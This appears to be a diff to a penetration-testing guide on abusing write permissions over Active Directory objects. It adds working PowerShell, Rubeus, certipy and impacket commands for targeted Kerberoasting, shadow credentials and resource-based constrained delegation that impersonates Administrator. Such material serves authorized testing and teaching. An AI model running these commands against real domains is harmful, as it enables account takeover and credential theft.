@@ -91,10 +91,26 @@ Impact: owner takeover that enables DACL modification.
 
 Common paths:
 
-- User object: add an SPN and Kerberoast the account.
+- User object: add an SPN and Kerberoast the account (targeted Kerberoasting).
 - User object: configure shadow credentials (`msDS-KeyCredentialLink`) when AD CS and PKINIT are usable.
 - Computer object: configure resource-based constrained delegation when machine-account quota and delegation settings allow it.
 - GPO object: modify linked policy only in explicitly authorized scope.
+
+```powershell
+# Targeted Kerberoasting: set fake SPN on target user, then roast it
+Set-DomainObject -Identity <target_user> -SET @{serviceprincipalname='fake/LEGIT'} -Credential $Cred
+.\Rubeus.exe kerberoast /user:<target_user> /nowrap
+# After cracking: clean up the SPN
+Set-DomainObject -Identity <target_user> -Clear serviceprincipalname -Credential $Cred
+
+# Shadow Credentials via GenericWrite
+certipy shadow auto -u attacker@domain.local -p pass -account <target_user> -dc-ip <dc_ip>
+
+# RBCD via GenericWrite on computer
+impacket-addcomputer domain.local/user:pass -computer-name 'EVIL$' -computer-pass 'P@ss123!'
+impacket-rbcd -delegate-from 'EVIL$' -delegate-to '<target_computer>$' -dc-ip <dc_ip> -action write 'domain.local/user:pass'
+impacket-getST -spn cifs/<target_computer> -impersonate Administrator -dc-ip <dc_ip> 'domain.local/EVIL$:P@ss123!'
+```
 
 ## Attack path selection
 
